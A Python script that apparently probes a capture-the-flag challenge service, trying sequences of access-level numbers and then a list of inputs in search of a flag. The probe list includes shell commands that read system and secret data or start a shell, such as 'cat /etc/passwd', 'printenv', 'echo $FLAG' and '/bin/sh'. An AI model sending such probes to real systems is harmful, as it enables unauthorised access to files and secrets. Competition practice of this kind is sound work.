#!/usr/bin/env python3
import socket
import time

def test_specific_sequence(sequence):
    """Test a specific sequence of access levels"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(10)
        
        print(f"=== TESTING SEQUENCE: {sequence} ===")
        sock.connect(('chals.uscc-cyberbowl-2025.ctf.institute', 3015))
        
        # Skip banner
        banner = sock.recv(4096)
        
        all_data = []
        
        for i, level in enumerate(sequence):
            print(f"Step {i+1}: Accessing level {level}")
            
            # Send level
            sock.send(f"{level}\n".encode('utf-8'))
            
            # Get response
            try:
                sock.settimeout(3)
                response = sock.recv(4096)
                decoded = response.decode('utf-8', errors='replace')
                print(f"  Response: {repr(decoded)}")
                all_data.append(decoded)
                
                # Check for flag immediately
                if 'flag' in decoded.lower() or 'uscc{' in decoded.lower() or ('{' in decoded and '}' in decoded):
                    print(f"*** POTENTIAL FLAG FOUND: {decoded} ***")
                    return decoded
                    
            except socket.timeout:
                print("  No response (timeout)")
            except Exception as e:
                print(f"  Error: {e}")
                break
        
        # Try final commands after sequence
        final_commands = ['', 'flag', 'show', 'status']
        for cmd in final_commands:
            try:
                print(f"Final command: {repr(cmd)}")
                sock.send(f"{cmd}\n".encode('utf-8'))
                sock.settimeout(2)
                response = sock.recv(4096)
                if response:
                    decoded = response.decode('utf-8', errors='replace')
                    print(f"  Final response: {repr(decoded)}")
                    if 'flag' in decoded.lower() or 'uscc{' in decoded.lower():
                        print(f"*** FLAG FOUND AFTER SEQUENCE: {decoded} ***")
                        return decoded
            except:
                pass
        
        sock.close()
        
        # Analyze combined data
        combined = ''.join(all_data)
        if len(combined) > 50:  # If we got substantial data
            print(f"Combined data: {repr(combined)}")
        
        return None
        
    except Exception as e:
        print(f"Sequence test error: {e}")
        return None

def test_all_patterns():
    """Test various access patterns"""
    
    patterns_to_test = [
        [1, 2, 3, 4, 5, 6],    # Sequential forward
        [6, 5, 4, 3, 2, 1],    # Sequential reverse
        [1, 6],                # First and last
        [6, 1],                # Last and first
        [1, 3, 5],             # Odd numbers
        [2, 4, 6],             # Even numbers
        [6, 6, 6],             # Triple 6
        [1, 1, 1],             # Triple 1
        [3, 1, 4, 1, 5, 9],    # Pi digits
        [1, 2, 1, 2, 1, 2],    # Alternating
        [6, 5, 6, 5, 6, 5],    # Alternating high
        [1, 6, 2, 5, 3, 4],    # Outside-in
        [4, 3, 5, 2, 6, 1],    # Inside-out
    ]
    
    for pattern in patterns_to_test:
        result = test_specific_sequence(pattern)
        if result and ('uscc{' in result.lower() or 'flag{' in result.lower()):
            print(f"\n*** SUCCESS! FLAG FOUND WITH PATTERN {pattern}: {result} ***")
            return result
        time.sleep(0.5)  # Small delay between tests
    
    return None

def test_long_connection():
    """Keep connection open and try multiple things"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(30)
        
        print("=== LONG CONNECTION TEST ===")
        sock.connect(('chals.uscc-cyberbowl-2025.ctf.institute', 3015))
        
        # Skip banner
        banner = sock.recv(4096)
        print(f"Banner: {banner.decode('utf-8', errors='replace')}")
        
        # Try accessing level 6 (highest) and then various commands
        print("Accessing level 6...")
        sock.send(b"6\n")
        response = sock.recv(4096)
        print(f"Level 6 response: {response.decode('utf-8', errors='replace')}")
        
        # Now try a bunch of things while we have level 6 access
        test_inputs = [
            "",
            "help",
            "flag",
            "cat flag.txt",
            "ls -la",
            "whoami",
            "id",
            "env",
            "printenv",
            "echo $FLAG",
            "/bin/sh",
            "sh",
            "bash",
            "cmd",
            "system",
            "exec",
            "vault",
            "secure",
            "compound",
            "boss",
            "admin",
            "root",
            "password",
            "secret",
            "key",
            "unlock",
            "open",
            "access",
            "show secrets",
            "list files",
            "dir /",
            "find / -name '*flag*'",
            "grep -r flag .",
            "cat /etc/passwd",
            "cat /flag",
            "cat flag",
            "type flag.txt",
            "more flag",
            "less flag",
            "head flag",
            "tail flag",
            "file flag",
            "strings flag",
            "hexdump flag",
            "od flag",
            "base64 flag",
            "xxd flag",
        ]
        
        for test_input in test_inputs:
            try:
                print(f"Trying: {repr(test_input)}")
                sock.send(f"{test_input}\n".encode('utf-8'))
                
                sock.settimeout(3)
                response = sock.recv(4096)
                
                if response:
                    decoded = response.decode('utf-8', errors='replace')
                    if decoded.strip() and "Enter access band" not in decoded:
                        print(f"  Response: {repr(decoded)}")
                        
                        # Check for flag
                        if 'uscc{' in decoded.lower() or 'flag{' in decoded.lower() or ('{' in decoded and '}' in decoded and len(decoded.strip()) > 10):
                            print(f"*** POTENTIAL FLAG: {decoded} ***")
                            return decoded
                
            except socket.timeout:
                pass
            except Exception as e:
                print(f"  Error with {repr(test_input)}: {e}")
                break
        
        sock.close()
        
    except Exception as e:
        print(f"Long connection error: {e}")
    
    return None

if __name__ == "__main__":
    # Test various patterns
    result = test_all_patterns()
    
    if not result:
        print("\n" + "="*60)
        print("TRYING LONG CONNECTION APPROACH")
        print("="*60)
        result = test_long_connection()
    
    if result:
        print(f"\n*** FINAL RESULT: {result} ***")
    else:
        print("\nNo flag found with current approaches.")